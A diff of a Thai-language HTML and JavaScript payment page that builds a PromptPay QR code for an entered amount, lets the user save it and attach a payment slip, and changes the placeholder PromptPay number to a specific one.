+
         <input type="number" id="mainAmountInput" value="100" min="1" 
+
                class="w-full px-4 py-3 pl-10 border border-slate-300 rounded-xl focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 outline-none text-lg font-semibold text-slate-700"
+
                placeholder="0.00">
+
         <span class="absolute left-3.5 top-3.5 text-slate-400 font-semibold">฿</span>
+
       </div>
+
     </div>
+
+
 
     <!-- ปุ่มเปิด Pop-up ชำระเงิน -->
+
     <button onclick="openPaymentModal()" class="w-full py-3.5 bg-indigo-600 hover:bg-indigo-700 text-white font-medium rounded-xl shadow-lg shadow-indigo-100 transition flex items-center justify-center gap-2">
+
       <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+
         <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v1m6 11h2m-6 0h-2v4m0-11v3m0 0h.01M12 12h4.01M16 20h4M4 12h4m12 0h.01M5 8h2a1 1 0 001-1V5a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1zm12 0h2a1 1 0 001-1V5a1 1 0 00-1-1h-2a1 1 0 00-1 1v2a1 1 0 001 1zM5 20h2a1 1 0 001-1v-2a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1z"></path>
+
       </svg>
+
       ดำเนินการชำระเงิน (QR Code)
+
     </button>
+
   </div>
+
+
 
   <!-- Pop-up Modal (รวม QR, ปุ่มบันทึก, และแนบสลิปไว้ในนี้ทั้งหมด) -->
+
   <div id="paymentModal" class="fixed inset-0 bg-slate-900/60 backdrop-blur-sm flex items-center justify-center p-4 z-50 hidden">
+
     <div class="bg-white rounded-2xl shadow-2xl max-w-md w-full p-6 relative max-h-[90vh] overflow-y-auto">
+
       
+
       <!-- ปุ่มปิด Pop-up -->
+
       <button onclick="closePaymentModal()" class="absolute top-4 right-4 text-slate-400 hover:text-slate-600 p-1 rounded-full hover:bg-slate-100 transition">
+
         <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+
           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+
         </svg>
+
       </button>
+
+
 
       <!-- หัวข้อ Pop-up -->
+
       <div class="text-center mb-5">
+
         <h3 class="text-xl font-bold text-slate-800">สแกนเพื่อชำระเงิน</h3>
+
         <p class="text-xs text-slate-500 mt-0.5">พร้อมเพย์ (PromptPay)</p>
+
       </div>
+
+
 
       <!-- 1. ส่วนแสดง QR Code และยอดเงิน -->
+
       <div class="flex flex-col items-center bg-slate-50 p-4 rounded-2xl border border-slate-100 mb-4">
+
         <div class="bg-white p-3 rounded-xl shadow-sm border border-slate-200 mb-2">
+
           <img id="qrCodeImage" src="" alt="PromptPay QR Code" class="w-44 h-44 object-contain">
+
         </div>
+
         <p class="text-sm font-semibold text-slate-600">ยอดชำระ: <span id="displayAmount" class="text-indigo-600 text-lg">0.00</span> บาท</p>
+
       </div>
+
+
 
       <!-- 2. ปุ่มบันทึก QR Code -->
+
       <button onclick="downloadQRCode()" class="w-full mb-4 py-2.5 px-4 border border-indigo-600 text-indigo-600 hover:bg-indigo-50 font-medium rounded-xl transition flex items-center justify-center gap-2 text-sm">
+
         <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+
           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path>
+
         </svg>
+
         บันทึก QR Code
+
       </button>
+
+
 
       <!-- เส้นคั่น -->
+
       <div class="border-t border-slate-100 my-4"></div>
 
+
+
       <!-- 3. ส่วนแนบสลิป -->
+
       <div class="mb-5">
+
         <label class="block text-sm font-medium text-slate-700 mb-2">แนบหลักฐานการชำระเงิน (สลิป)</label>
+
         <label class="flex flex-col items-center justify-center w-full h-24 border-2 border-slate-300 border-dashed rounded-xl cursor-pointer bg-slate-50 hover:bg-slate-100 transition">
+
           <div class="flex flex-col items-center justify-center pt-3 pb-4 px-4 text-center">
+
             <svg class="w-6 h-6 mb-1 text-slate-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+
               <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path>
+
             </svg>
+
             <p class="text-xs text-slate-500"><span class="font-semibold text-indigo-600">คลิกเพื่ออัปโหลดสลิป</span> หรือลากไฟล์มาวาง</p>
+
             <p id="fileName" class="text-xs text-slate-600 mt-1 font-medium truncate max-w-[250px]"></p>
+
           </div>
+
           <input type="file" class="hidden" accept="image/*" onchange="handleFileSelect(event)">
+
         </label>
+
       </div>
 
+
+
       <!-- ปุ่มยืนยันการชำระเงิน -->
+
       <button onclick="submitPayment()" class="w-full py-3.5 bg-indigo-600 hover:bg-indigo-700 text-white font-medium rounded-xl shadow-lg shadow-indigo-100 transition">
+
         ยืนยันการชำระเงิน
+
       </button>
 
+
+
     </div>
+
   </div>
 
+
+
   <script>
+
     // ⚠️ เปลี่ยนเบอร์โทรศัพท์พร้อมเพย์ของคุณตรงนี้ (หรือใส่เลขประจำตัวผู้เสียภาษี)
-    const promptPayNumber = "0812345678"; 
+
+    const promptPayNumber = "0658351446"; 
+
+
 
     function openPaymentModal() {
+
       let amount = document.getElementById('mainAmountInput').value;
+
       
+
       // ตรวจสอบความถูกต้องของตัวเลข
+
       if (!amount || amount <= 0) {
+
         alert('กรุณากรอกจำนวนเงินให้ถูกต้องก่อนทำรายการ');
+
         document.getElementById('mainAmountInput').focus();
+
         return;
+
       }
+
+
 
       // อัปเดตตัวเลขแสดงผลใน Pop-up
+
       document.getElementById('displayAmount').innerText = parseFloat(amount).toLocaleString('th-TH', {minimumFractionDigits: 2});
+
       
+
       // อัปเดตลิงก์รูปภาพ QR Code พร้อมเพย์ตามยอดที่ลูกค้ากรอก
+
       document.getElementById('qrCodeImage').src = `https://promptpay.io/${promptPayNumber}/${amount}.png`;
 
+
+
       // แสดง Pop-up
+
       document.getElementById('paymentModal').classList.remove('hidden');
+
     }
+
+
 
     function closePaymentModal() {
+
       document.getElementById('paymentModal').classList.add('hidden');
+
     }
+
+
 
     function downloadQRCode() {
+
       const imageUrl = document.getElementById('qrCodeImage').src;
+
       const a = document.createElement('a');
+
       a.href = imageUrl;
+
       a.download = 'promptpay-qrcode.png';
+
       document.body.appendChild(a);
+
       a.click();
+
       document.body.removeChild(a);
+
     }
+
+
 
     function handleFileSelect(event) {
+
       const file = event.target.files[0];
+
       if (file) {
+
         document.getElementById('fileName').innerText = `ไฟล์ที่เลือก: ${file.name}`;
+
       }
+
     }
+
+
 
     function submitPayment() {
+
       // ตรงนี้สามารถเพิ่มโค้ดส่งข้อมูลไปยัง Backend (เช่น ส่งรูปสลิปและยอดเงิน) ได้ตามต้องการ
+
       alert('บันทึกข้อมูลการชำระเงินเรียบร้อยแล้ว!');
+
       closePaymentModal();
+
     }
+
   </script>
 
+
+
 </body>
+
 </html>
